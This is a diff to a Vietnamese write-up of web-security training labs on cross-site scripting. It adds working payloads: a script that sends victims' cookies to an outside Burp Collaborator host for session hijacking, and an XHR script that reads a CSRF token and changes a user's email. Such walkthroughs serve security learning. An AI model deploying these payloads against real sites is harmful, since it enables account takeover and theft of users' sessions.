@@ -103,11 +103,38 @@ Ta thấy website đã chặn XSS bằng đoạn code `html.replace('<', '&lt;')
 Submit một comment với phần body là `<><img src=1 onerror=alert(1)>`, kết quả thành công.
 
 # 14. Exploiting cross-site scripting to steal cookies
+Ta submit một comment chứa nội dung là đoạn code sau:
+```
+<script>
+    fetch('https://uxv889vycw7d8z1pxaxkp4kzcqig65.oastify.com?cookie='+encodeURIComponent(document.cookie));</script>
+```
+Sau khi submit, vào Burp Collaborator Client kiểm tra thì thấy có request được gửi đến, trong đó có chứa session của nạn nhân
 
+![image](https://user-images.githubusercontent.com/103978452/208383188-42d00b62-8dd5-4f8e-9d7e-7bc692eba4e4.png)
+
+Thay đổi session của mình thành session thu được, kết quả thành công.
 
 # 15. Exploiting cross-site scripting to capture passwords
 
 # 16. Exploiting XSS to perform CSRF
+Ta submit một comment với phần body có nội dung:
+```
+<script>
+xhr = new XMLHttpRequest();
+xhr.onreadystatechange = () => {
+    let res = xhr.responseText;
+    let csrf = new DOMParser().parseFromString(res, 'text/html').querySelector('input[name=csrf]').value;
+    let params = 'email=attacker%40gmail.com&csrf='+csrf;
+    xhr2 = new XMLHttpRequest();
+    xhr2.open('POST', '/my-account/change-email');
+    xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr2.send(params);
+}
+xhr.open('GET', '/my-account');
+xhr.send();
+</script>
+```
+Đoạn code trên khi được thực thi sẽ truy cập `/my-account`, lấy ra csrf token rồi dùng csrf token đó để thực hiện đổi email của người dùng. Sau khi submit, kết quả thành công.
 
 # 17. Reflected XSS into HTML context with most tags and attributes blocked
 
